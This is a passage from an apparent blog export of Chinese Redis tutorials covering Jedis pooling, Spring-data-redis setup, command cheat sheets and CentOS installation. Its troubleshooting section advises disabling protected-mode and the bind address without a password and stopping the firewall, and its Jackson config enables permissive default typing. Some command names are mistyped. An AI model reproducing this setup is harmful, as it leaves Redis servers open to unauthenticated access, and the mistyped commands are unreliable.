class="comment">//这里使用的close不代表关闭连接，指的是归还资源</span></span><br><span class="line">                jedis.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>Jedis<code>直连</code>与Jedis<code>连接池</code>使用的对比</p><p>| 方案        | 优点                                                         | 缺点                                                         |<br>| —————- | —————————————————————————————— | —————————————————————————————— |<br>| Jedis直连   | 简单方便<br>适用于连接数较少且使用时间较长，可构成长连接场景 | 存在每次新建/关闭TCP开销<br>资源无法控制，存在连接泄露的可能<br>Jedis对象线程不安全 |<br>| Jedis连接池 | Jedis预先生成，降低开销<br>连接池的形成保护和控制资源的使用  | 相对于直连，使用相对麻烦，尤其在资源管理上需要很多参数来保证，一旦规划不合理就会出现问题 |</p></li></ol><h2 id="Spring-data-redis如何配置"><a href="#Spring-data-redis如何配置" class="headerlink" title="Spring-data-redis如何配置"></a>Spring-data-redis如何配置</h2><ol><li><p>spring-data-redis引入依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--        redis--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.6</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li><li><p>添加配置文件<code>application.properties</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#Redis服务器地址</span><br><span class="line">spring.redis.host=<span class="number">192.168</span><span class="number">.30</span><span class="number">.0</span></span><br><span class="line">#Redis服务器连接端口（默认端口为<span class="number">6379</span>）</span><br><span class="line">spring.redis.port=<span class="number">6379</span></span><br><span class="line">#Redis数据库索引（默认位<span class="number">0</span>）</span><br><span class="line">spring.redis.database=<span class="number">0</span></span><br><span class="line">#连接超时时间（毫秒）</span><br><span class="line">spring.redis.timeout=<span class="number">1800000</span></span><br><span class="line">#连接池最大连接数（使用负值表示没有限制）</span><br><span class="line">spring.redis.lettuce.pool.max-active=<span class="number">20</span></span><br><span class="line">#最大阻塞等待时间（复数表示没有限制）</span><br><span class="line">spring.redis.lettuce.pool.max-wait=-<span class="number">1</span></span><br><span class="line">#连接池中的最大空闲连接</span><br><span class="line">spring.redis.lettuce.pool.max-idle=<span class="number">5</span></span><br><span class="line">#连接池中的最小空闲连接</span><br><span class="line">spring.redis.lettuce.pool.min-idle=<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li><p>添加Redis配置类<code>RedisConfig.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableCaching</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="title">redisTemplate</span><span class="params">(RedisConnectionFactory factory)</span> </span>&#123;</span><br><span class="line">        RedisTemplate&lt;String, Object&gt; template = <span class="keyword">new</span> RedisTemplate();</span><br><span class="line">        RedisSerializer&lt;String&gt; redisSerializer = <span class="keyword">new</span> StringRedisSerializer();</span><br><span class="line">        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = <span class="keyword">new</span> Jackson2JsonRedisSerializer(Object.class);</span><br><span class="line">        ObjectMapper om = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);</span><br><span class="line">        om.activateDefaultTyping(LaissezFaireSubTypeValidator.instance ,</span><br><span class="line">                ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);</span><br><span class="line">        jackson2JsonRedisSerializer.setObjectMapper(om);</span><br><span class="line">        template.setConnectionFactory(factory);</span><br><span class="line">        template.setKeySerializer(redisSerializer);</span><br><span class="line">        template.setValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">        template.setHashValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">        <span class="keyword">return</span> template;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CacheManager <span class="title">cacheManager</span><span class="params">(RedisConnectionFactory factory)</span> </span>&#123;</span><br><span class="line">        RedisSerializer&lt;String&gt; redisSerializer = <span class="keyword">new</span> StringRedisSerializer();</span><br><span class="line">        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = <span class="keyword">new</span> Jackson2JsonRedisSerializer(Object.class);</span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        objectMapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);</span><br><span class="line">        objectMapper.activateDefaultTyping(LaissezFaireSubTypeValidator.instance ,</span><br><span class="line">                ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);</span><br><span class="line">        jackson2JsonRedisSerializer.setObjectMapper(objectMapper);</span><br><span class="line">        RedisCacheConfiguration config = RedisCacheConfiguration.defaultCacheConfig()</span><br><span class="line">                .entryTtl(Duration.ofSeconds(<span class="number">600</span>))</span><br><span class="line">                .serializeKeysWith(RedisSerializationContext.SerializationPair.fromSerializer(redisSerializer))</span><br><span class="line">                .serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(jackson2JsonRedisSerializer))</span><br><span class="line">                .disableCachingNullValues();</span><br><span class="line">        RedisCacheManager cacheManager = RedisCacheManager.builder(factory)</span><br><span class="line">                .cacheDefaults(config)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="keyword">return</span> cacheManager;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>创建Controller试验一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/redisTest&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisTestControllor</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testRedis</span><span class="params">()</span></span>&#123;</span><br><span class="line">        redisTemplate.opsForValue().set(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;zeker&quot;</span>);</span><br><span class="line">        String name = (String) redisTemplate.opsForValue().get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>根据自己开设的端口访问<code>http://localhost:8080/redisTest</code></p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210806/666ae2ea6a519635d9932f43f286144.mt0bja0dxmo.png" alt="1"></p><h2 id="常见问题及解决方法"><a href="#常见问题及解决方法" class="headerlink" title="常见问题及解决方法"></a>常见问题及解决方法</h2><div class="note info no-icon flat"><p>Could not get a resource from the pool; nested exception is io.lettuce.core.RedisConnectionException: Unable to connect to 192.168.30.0:6379</p></div><p>1、查看是否启动Redis服务器</p><p>2、查看目标IP地址是否可以ping通</p><p>3、Redis的配置application.yml（或application.properties）中spring.redis.timeout连接超时时间（毫秒）中设置不能为0</p><p>4、修改redis的配置文件redis.conf</p><ol><li>protected-mode yes 改为 protected-mode no<br>（该配置项表示是否开启保护模式，默认是开启，开启后Redis只会本地进行访问，拒绝外部访问）</li><li>注释掉 bin127.0.0.1 即 #bin 127.0.0.1<br>（PS: 不注释掉，表示指定 Redis 只接收来自于该 IP 地址的请求，注释掉后，则表示将处理所有请求）</li></ol><div class="note warning flat"><p>修改配置文件redis.conf后记得保存重启redis</p></div><p>5、如果在Redis中没有配置requirepass，那么在application.properties（或application.yaml）中就不要写spring.redis.password</p><p>6、开放对应端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --add-port=6379/tcp# 开放6379端口号</span><br><span class="line">firewall-cmd --query-port=6379/tcp# 查看端口号是否打开</span><br></pre></td></tr></table></figure><div class="note info no-icon flat"><p>PS：云服务器需在安全组中设置对应端口号，不建议开放所有端口。在<code>虚拟机上测试</code>也可以选择关闭防火墙<code>systemctl stop firewalld</code>。</p></div><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>Jedis</code>是Redis官方推荐的面向Java的操作Redis的客户端，而<code>RedisTemplate</code>是<code>Spring-data-redis</code>中对<code>Jedis</code>Api的高度封装。</p><p><code>Spring-data-redis</code>相对于Jedis来说可以方便地更换Redis的Java客户端，比Jedis多了自动管理连接池的特性，方便与其他Spring框架进行搭配使用</p><p>总体来说，<code>Jedis</code>，更像<code>spring 与 MySQL</code>结合，通过操作连接池，获取实例操作数据库，而<code>Spring-data-redis</code>与spring的整合，更像<code>spring 与 mybatis</code>整合，通过工厂，创建实例，再操作实例。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> Redis </tag>
            
            <tag> Spring boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis学习笔记（1）</title>
      <link href="/posts/d9238aea/"/>
      <url>/posts/d9238aea/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Redis键（key）"><a href="#Redis键（key）" class="headerlink" title="Redis键（key）"></a>Redis键（key）</h2><div class="table-container"><table><thead><tr><th style="text-align:left">命令</th><th>描述</th></tr></thead><tbody><tr><td style="text-align:left">keys *</td><td>查看当前库所有key</td></tr><tr><td style="text-align:left">exists \<key></td><td>判断某个key是否存在</td></tr><tr><td style="text-align:left">type \<key></td><td>查看key是什么类型</td></tr><tr><td style="text-align:left">del \<key></td><td>删除指定的key数据</td></tr><tr><td style="text-align:left">expore \<key> \<time></td><td>为给定的key设置过期时间time（单位秒）</td></tr><tr><td style="text-align:left">ttl \<key></td><td>查看还有多少秒过期，-1表示永不过期，-2表示已过期</td></tr><tr><td style="text-align:left">select \<index></td><td>切换当前数据库（共16个数据库，0为默认库）</td></tr><tr><td style="text-align:left">dbsize</td><td>查看当前数据库key的数量</td></tr><tr><td style="text-align:left">flushdb/flushall</td><td>清空当前库/全部库</td></tr></tbody></table></div><h2 id="Redis字符串（String）"><a href="#Redis字符串（String）" class="headerlink" title="Redis字符串（String）"></a>Redis字符串（String）</h2><p><code>String</code>类型是二进制安全的，意味着Redis的<code>String</code>可包含任何数据，比如jpg图片或者序列化的对象。</p><p>一个Redis中字符串value最多可以是512M。</p><div class="table-container"><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>set \<key> \<value></td><td>添加键值对</td></tr><tr><td>get \<key></td><td>查询对应键值</td></tr><tr><td>append \<key> \<value></td><td>将给定的value追加到原值的末尾</td></tr><tr><td>strlen \<key></td><td>获得key的长度</td></tr><tr><td>setnx \<key> \<value></td><td>只有在key不存在时，才能设置key的值</td></tr><tr><td>incr/decr \<key></td><td>将key中储存的数字值增/减（+/-） 1</td></tr><tr><td>incrby/decrby \<key> \&lt;步长&gt;</td><td>将key中储存的数字值增/减，自定义步长</td></tr><tr><td>mset \<key1>\<value1>\<key2>\<value2>….</td><td>同时设置一个或多个key-value对</td></tr><tr><td>mget \<key1>\<key2>….</td><td>同时获取一个或多个value</td></tr><tr><td>msetnx \<key1>\<value1>\<key2>\<value2>….</td><td>同时设置一个或多个key-value对，当且仅当所有给定key都不存在</td></tr><tr><td>getrange \<key> \&lt;起始位置&gt;\&lt;结束位置&gt;</td><td>获得值的范围（全部：get key 0 -1）</td></tr><tr><td>setrange \<key>\&lt;起始位置&gt;\<value></td><td>用value覆写key所储存的字符串值，从起始位置开始（索引从0开始）</td></tr><tr><td>setnx \<key> \&lt;过期时间&gt;\<value></td><td>设置键值的同时，设置过期时间（单位秒）</td></tr><tr><td>getset\<key>\<value></td><td>设置新值同时获得旧值</td></tr></tbody></table></div><h2 id="Redis列表（List）"><a href="#Redis列表（List）" class="headerlink" title="Redis列表（List）"></a>Redis列表（List）</h2><p><strong>单键多值，双向链表</strong></p><div class="table-container"><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>lpush/rpush \<key> \<value1> \<value2>….</td><td>从左边/右边插入一个或多个值</td></tr><tr><td>lpop/rpop  \<key></td><td>从左边/右边吐出一个值。</td></tr><tr><td>rpoplpush  \<key1> \<key2></td><td>从key1列表右边吐出一个值，查到key2列表右边</td></tr><tr><td>lrange \<key> \<start> \<stop></td><td>按照索引下标获得元素（从左到右）\<br>（全部：lrange key 0 -1）</td></tr><tr><td>lindex \<key> \<index></td><td>按照索引下标获得元素（从左到右）</td></tr><tr><td>llen \<key></td><td>获得列表的长度</td></tr><tr><td>linsert \<key> before/after \<value> \<newvalue></td><td>在value的前/后面插入newvalue值</td></tr><tr><td>lrem \<key> \<n> \<value></td><td>从左边删除n个value（从左到右）</td></tr><tr><td>lset \<key> \<index> \<value></td><td>将列表key下标为index的值替换成value</td></tr></tbody></table></div><h2 id="Redis集合（Set）"><a href="#Redis集合（Set）" class="headerlink" title="Redis集合（Set）"></a>Redis集合（Set）</h2><p>Redis的集合<code>Set</code>是String类型的无序集合，与list类似是一个列表的功能，但<code>Set</code>可以自动数据排重。底层是一个value为<code>null</code>的hash表，所以添加、删除、查找的复杂度都为<code>O(1)</code>。</p><div class="table-container"><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>sadd \<key> \<member1> \<member2>….</td><td>将一个或多个member元素加入到集合key中，已存在的member将被忽略</td></tr><tr><td>smembers \<key></td><td>取出该集合的所有值</td></tr><tr><td>sismember \<key> \<member></td><td>判断集合key是否含有该member值，有则1，无则0</td></tr><tr><td>scard \<key></td><td>返回该集合的元素个数</td></tr><tr><td>srem \<key> \<member1> \<member2>….</td><td>删除集合中的某个元素</td></tr><tr><td>spop \<key></td><td>随机从该集合中吐出一个值</td></tr><tr><td>srandmember \<key> \<n></td><td>随机从该集合中取出n个值。值不会从集合中删除</td></tr><tr><td>smove \<source> \<destination>  \<member></td><td>把集合中的一个member值从一个集合移动到另一个集合中</td></tr><tr><td>sinter/sunion \<key1> \<key2></td><td>返回两个集合的交集/并集元素</td></tr><tr><td>sdiff \<key1> \<key2></td><td>返回两个集合的差集元素（key1中的，不包含key2中的）</td></tr></tbody></table></div><h2 id="Redis哈希（Hash）"><a href="#Redis哈希（Hash）" class="headerlink" title="Redis哈希（Hash）"></a>Redis哈希（Hash）</h2><p>Redis的<code>Hash</code>是一个String类型的field和value的映射表，hash适合用于存储对象，类似Java中的<code>Map&lt;String, Object&gt;</code>。</p><p>当key存储的value过多时，往往为了提高查询效率，例如用户ID为key，field有姓名、年龄、职业等信息，这是我们可以选择通过key(用户ID)+field(属性标签)就可以操作对应属性的数据。</p><p>类似于map套娃：<code>&lt;String， &lt;Map&lt;key, value&gt;&gt;&gt;</code></p><div class="note green no-icon flat"><p>好处：既不需要重复存储数据，避免了数据冗余，也不会带来序列化和并发修改控制的问题。</p></div><div class="table-container"><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>hset \<key> \<field> \<value></td><td>给key集合中的field键赋值value，例：hset user:001 name zeker</td></tr><tr><td>hget \<key> \<field></td><td>从key集合中的fild中取出value</td></tr><tr><td>hmset \<key> \<field1> \<value1> \<field2> \<value2>….</td><td>批量设置hash的值</td></tr><tr><td>hexists \<key> \<field></td><td>查看哈希表key中，给定field是否存在</td></tr><tr><td>hkeys \<key></td><td>列出该hash集合的所有field</td></tr><tr><td>hvals \<key></td><td>列出该hash集合的所有value</td></tr><tr><td>hincrby \<key> \<field> \<increment></td><td>为哈希表key中的field的值加上增量increment（例：1 -1）</td></tr><tr><td>hsetnx \<key> \<field> \<value></td><td>将哈希表key中的field的值设置为value，当且仅当field不存在</td></tr></tbody></table></div><h2 id="Redis有序集合（Zset）"><a href="#Redis有序集合（Zset）" class="headerlink" title="Redis有序集合（Zset）"></a>Redis有序集合（Zset）</h2><p>Redis有序集合<code>Zset</code>与普通集合Set相似，都是一个没有重复元素的字符串集合。</p><p>不同之处在于有序集合<code>Zset</code>的每个成员都关联了一个评分（score），这个评分（score）被用来按照从最低分到最高分的方式排序集合中的成员。</p><p>集合中的成员是唯一的，但评分可以是重复的。这里例子可以为：排行榜</p><div class="table-container"><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>zadd \<key> \<score1> \<member1> \<score2> \<member2>….</td><td>将一个或多个memeber元素及其score值加入到有序集key中</td></tr><tr><td>zrange \<key> \<start> \<stop> [withscores]</td><td>返回有序集key中，下标在start与stop之间的元素(withscores可让分数与值返回到结果集</td></tr><tr><td>zrangebyscore key min max [withscoers]  [limit offset count]</td><td>返回有序集key中，所有score值介于min和max之间（包括等于min或max）的成员，有序集成员按score值递增（从小到大）次序排列</td></tr><tr><td>zrevrangebyscore key max min [withscoers]  [limit offset count]</td><td>dev：反转。意思同上，次序从大到小排列</td></tr><tr><td>zincrby \<key> \<increment> \<member></td><td>为元素member的score加上增量increment</td></tr><tr><td>zrem \<key> \<member></td><td>删除该集合下指定值的元素</td></tr><tr><td>zcount \<key> \<min> \<max></td><td>统计该集合中分数区间内的元素个数</td></tr><tr><td>zrank \<key> \<member></td><td>返回该元素member在集合中的排名，从0开始</td></tr></tbody></table></div><p>Zset底层中使用了两种数据结构：hash表与跳跃表</p><ol><li>hash表，作用就是关联元素value和权重score，保障元素value的唯一值，可以通过元素value找到相应的score值。</li><li>跳跃表，目的在于给元素value排序，根据score的范围获取元素列表，从而比普通列表查询效率更快。</li></ol><h2 id="Redis新数据类型"><a href="#Redis新数据类型" class="headerlink" title="Redis新数据类型"></a>Redis新数据类型</h2><h3 id="Bitmaps"><a href="#Bitmaps" class="headerlink" title="Bitmaps"></a>Bitmaps</h3><p>Redis提供<code>Bitmaps</code>这个”数据类型“可以实现对位的操作：</p><p>（1）<code>Bitmaps</code>本身不是一种数据结构，实际上就是字符串，但是它可以对字符串的位进行操作。、</p><p>（2）<code>Bitmaps</code>单独提供了一套命令，所以在Redis中使用<code>Bitmaps</code>和使用字符串的方法不太相同。可以<code>Bitmaps</code>想象成一个以位为单位数组，数组中的每个单元只能存0或者1，数组的下标在<code>Bitmaps</code>中叫做偏移量。单个<code>Bitmaps</code>的最大长度是<code>512MB</code>，即<code>2^32</code>个比特位。</p><div class="note green no-icon flat"><p>合理地使用操作位能够有效地提高内存使用率和开发效率，并且可以极大地节省内存空间。<br>例如：用户访问，统计不同电话号码的个数以及布隆过滤法（URL的排重、垃圾邮箱地址的过滤）……</p></div><div class="table-container"><table><thead><tr><th>命令</th><th>描述</th><th></th></tr></thead><tbody><tr><td>setbit \<key> \<offset> \<value></td><td>设置Bitmaps中某个偏移量offset的值value</td><td></td></tr><tr><td>getbit \<key> \<offset></td><td>获取Bitmaps中某个偏移量offset的值value</td><td></td></tr><tr><td>bitcount \<key> [start end]</td><td>统计字符串从start字节到end字节比特值为1的数量</td><td></td></tr><tr><td>bitop and(or/not/xor) \<destkey> [key….]</td><td>多个Bitmaps的and（交集）、or（并集）、not（非）、xor（异或）操作并将结果保存在destkey中</td></tr></tbody></table></div><h3 id="HyperLogLog"><a href="#HyperLogLog" class="headerlink" title="HyperLogLog"></a>HyperLogLog</h3><div class="note default no-icon flat"><p>在工作当中，经常会遇到与统计相关的功能需求，比如统计网站PV（PageView页面访问量）,可以使用Redis的incr、incrby轻松实现。<br>但像UV（UniqueVisitor，独立访客）、独立IP数、搜索记录数等需要去重和计数的问题如何解决？而这种求集合中不重复元素个数的问题称为基数问题。</p></div><p>解决基数问题方案：</p><p>（1）数据存储在MySQL表中，使用distinct count计算不重复个数</p><p>（2）使用Redis提供的hash、set、bitmaps等数据结构来处理</p><p>以上的方案结果精确，但随着数据不断增加，导致占用空间越来越大，对于非常大的数据集是不切实际的。</p><p>为了能够降低一定的精度来平衡存储空间，Redis推出了HyperLogLog，一种用来做基数统计的算法。</p><p>其优点在于：</p><p>在输入元素的数量或者体积非常非常大时，计算基数所需的空间总是固定的、并且是很小的。</p><p>每个<code>HyperLogLog</code>键只需要花费 <code>12 KB</code>内存，就可以计算接近 <code>2^64</code> 个不同元素的<code>基数</code>。这和计算基数时，元素越多耗费内存就越多的集合形成鲜明对比。</p><div class="note info flat"><p>基数 = 数据集元素个数 - 重复数字个数</p></div><p>但是，因为<code>HyperLogLog</code>只会根据输入元素来计算基数，而不会储存输入元素本身，所以 <code>HyperLogLog</code>不能像集合那样，返回输入的各个元素。</p><div class="table-container"><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>padd \<key> \<element> [element….]</td><td>添加指定元素element到HyperLogLog中</td></tr><tr><td>pfcount \<key> [key….]</td><td>计算key中的基数</td></tr><tr><td>pfmerge \<destkey> \<sourcekey> [sourcekey….]</td><td>将一个或多个key合并后的结果储存在另一个destkey中</td></tr></tbody></table></div><h3 id="Geospatital"><a href="#Geospatital" class="headerlink" title="Geospatital"></a>Geospatital</h3><p><code>Redis GEO</code>，Geographic，地理信息的缩写。</p><p>主要用于存储地理位置信息，即经纬度（二维坐标），基于该类型，提供了经纬度设置，查询，范围查询，距离查询，经纬度Hash等常见操作。</p><div class="table-container"><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>geoadd \<key> \<longitude> \<latitude> \<member> [longitude latitude member….]</td><td>添加地理位置（经度、维度、名称）（有效经度：-180度到180度；有效纬度：-85.05112878度到85.05112878度）</td></tr><tr><td>geopos \<key> \<member> [member….]</td><td>获得指定地区member的坐标</td></tr><tr><td>geodist \<key> \<member1> \<member2> [m\</td><td>km\</td><td>ft\</td><td>mi]</td><td>获取两个指定地区位置之间的直线距离（单位：米\</td><td>千米\</td><td>英尺\</td><td>英里，默认单位米）</td></tr><tr><td>georadius \<key> \<longitude> \<latitude> radius    m\</td><td>km\</td><td>ft\</td><td>mi</td><td>以给定的经纬度为中心找出某一半径radius内的元素</td></tr></tbody></table></div><h2 id="Redis事务命令"><a href="#Redis事务命令" class="headerlink" title="Redis事务命令"></a>Redis事务命令</h2><p>一个事务从开始到执行会经历以下三个阶段：</p><ul><li>开始事务</li><li>命令入队</li><li>执行事务</li></ul><div class="table-container"><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>multi</td><td>标记一个事务块的开始，开始对命令的组队阶段</td></tr><tr><td>exec</td><td>执行所有事务块内的命令，开始执行阶段</td></tr><tr><td>discard</td><td>取消事务，放弃执行事务块内的所有命令</td></tr><tr><td>watch \<key> [key….]</td><td>监视一个（或多个）key，如果在事务执行之前这个（或这些）key被其他命令锁改动，那么事务将被打断</td></tr><tr><td>unwatch</td><td>取消watch命令对所有key的监视</td></tr></tbody></table></div><p>组队阶段中某个命令出现了命令报错，执行阶段整个的所有队列都会被取消。</p><p>而当组队阶段无报错，执行阶段某一命令出现了命令报错，则只有报错的命令不会被执行，其他命令不受影响。</p><p>当出现事务冲突时，Redis往往呈现出<code>乐观锁</code>的形式进行处理，即在使用完数据<code>修改版本号</code>等机制，提高吞吐量，而Redis就是利用这种<code>check-and-set</code>机制实现事务。</p><h3 id="事务三特性"><a href="#事务三特性" class="headerlink" title="事务三特性"></a>事务三特性</h3><div class="table-container"><table><thead><tr><th>特性</th><th>描述</th></tr></thead><tbody><tr><td>单独的隔离操作</td><td>事务中的所有命令都会序列化、按顺序地执行。事务在执行的过程中，不会被其他客户端发送来的命令请求所打断</td></tr><tr><td>没有隔离级别的概念</td><td>队列中的命令没有提交之前都不会实际地被执行，因为事务提交前任何指令都不会被实际执行</td></tr><tr><td>不保证原子性</td><td>Redis同一个事务中如果有一条命令执行失败，其后的命令仍然会被执行，没有回滚</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos安装Redis及相关操作</title>
      <link href="/posts/9d3a5b2a/"/>
      <url>/posts/9d3a5b2a/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Centos导入Redis安装包"><a href="#Centos导入Redis安装包" class="headerlink" title="Centos导入Redis安装包"></a>Centos导入Redis安装包</h2><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>第一种方案</span></div>    <div class="hide-content"><h3 id="前往Redis官网下载安装包"><a href="#前往Redis官网下载安装包" class="headerlink" title="前往Redis官网下载安装包"></a>前往<a href="http://redi.io">Redis官网</a>下载安装包</h3><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210722/1.4b8tzfon68k0.jpg" alt="1"></p><h3 id="通过Xftp将已下载好的安装包拖拽到centos的新建目录下"><a href="#通过Xftp将已下载好的安装包拖拽到centos的新建目录下" class="headerlink" title="通过Xftp将已下载好的安装包拖拽到centos的新建目录下"></a>通过Xftp将已下载好的安装包拖拽到centos的新建目录下</h3><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210722/2.kd9zl46gwc0.jpg" alt="2"></p><h3 id="查看安装包是否在选定目录下"><a href="#查看安装包是否在选定目录下" class="headerlink" title="查看安装包是否在选定目录下"></a>查看安装包是否在选定目录下</h3><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210722/3.6app3qipdg40.jpg" alt="3"></p></div></div><div class="hide-toggle" style="border: 1px solid #fff8e9"><div class="hide-button toggle-title" style="background-color: #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>第二种方案</span></div>    <div class="hide-content"><p>在Centos直接安装，下载之前，建议新建一个文件夹来存放安装包<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-6.2.4.tar.gz   #下载最新版即可</span><br></pre></td></tr></table></figure></p></div></div><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol><li>安装C语言的编译环境gcc</li></ol><p>依次输入以下命令<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install centos-release-scl scl-utils-build</span><br><span class="line">yum install -y devtollset-8-toolchain</span><br><span class="line">scl enable 